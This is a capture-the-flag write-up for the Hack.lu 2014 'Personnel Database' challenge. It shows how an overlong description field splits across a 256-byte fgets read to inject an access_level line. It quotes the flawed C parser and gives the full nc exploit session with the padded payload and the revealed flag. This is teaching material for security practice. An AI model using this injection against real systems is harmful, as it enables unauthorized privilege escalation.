---
layout: post
title: "Personnel Database"
date: 2014-10-23
ctf: Hack.lu 2014
author: Piotr Kordy
---

*Category:* Exploiting

*Points:* 150

*Author:* TheJH

*Description:*

Lots of criminals in this area work for one big boss, but we have been unable
to determine who he is. We know that their organization has one central
personnel database that might also contain information about their boss,
whose username is simply “boss”. However, when you register in their system,
you only get access level zero, which is not enough for reading data about
the boss - that guy is level 10. Do you think you can get around their
protections?

link: [personnel_database_server_67e4ead6aeb111cc19de03d1f3d15fab.c][1]

`nc wildwildweb.fluxfingers.net 1410`

Note: The users dir will be wiped every 5 minutes.


Write-up
--------

We are given a source code of the program running on the server. We can run the
following commands:

 - `whoami` - prints user name
 - `user` 'username' - set user name for login
 - `pass` 'password' - provides password and logins us
 - `register` 'username:password' - registers new user
 - `set_description` *description' - registers new user
 - `logout` - logs us out and writes changes to the file
 - `whois` 'username' - prints info about user - we must have higher acces rights than the user
 - `levelup` 'username' - increases the access level for the user, but we must have higher access level.

Each user have user name, password, access level and descripiton. Usernames are
sanitized to match [a-zA-Z0-9_]{1,20}. The data about each user is stored in
separate file in `users` directory. The interesting part is how the data about
the user is read from the file:

{% highlight c %}
struct userdata *read_userfile(char *user) {
  struct userdata *res = calloc(1, sizeof(*res));
  if (res == NULL) return NULL;
  int fd = open_userfile(user, O_RDONLY);
  if (fd == -1) return NULL;
  FILE *f = fdopen(fd, "r");
  if (f == NULL) { close(fd); return NULL; }
  char line[256];
  while (fgets(line, sizeof(line), f)) {
    rtrim(line);
    char *key = line;
    char *eqsign = strchr(line, '=');
    if (!eqsign) continue;
    *eqsign = '\0';
    char *value = eqsign+1;

    if (!strcmp(key, "hash")) res->hash = atoll(value);
    else if (!strcmp(key, "access_level")) res->access_level = atoi(value);
    else if (!strcmp(key, "description")) strcpy(res->description, value);
    else printf("fatal error: bad key \"%s\" in config, aborting\n", key), exit(1);
  }
  return res;
}
{% endhighlight %}

Each line is parsed separatly, but it can be at
most 256 bytes (size of the buffer used). So line longer than 256 bytes will be
read as two separate lines. Here is the example file with user's data:

	hash=770370358
	access_level=0
	description=some description with = sign

The idea is to submit line with proper length that will be interpreted as two
lines. In this way we can set our priviliges to high value. 

Here is the list of commands that gives us the flag:

	nc wildwildweb.fluxfingers.net 1410
	> register a:password
	user created successfully
	> set_description ***************************************************************************************************************************************************************************************************************************************************access_level=11
	description set
	> logout
	Uh, who are you again? I have forgotten.
	> user a
	username accepted, please provide password
	> pass password
	login ok
	> whois boss
	user	boss
	level	10
	descr	"flag{this_is_why_gets_is_better_than_fgets}"


[1]: http://afnom.net/assets/2014/personnel_database_server_67e4ead6aeb111cc19de03d1f3d15fab.c      "file"

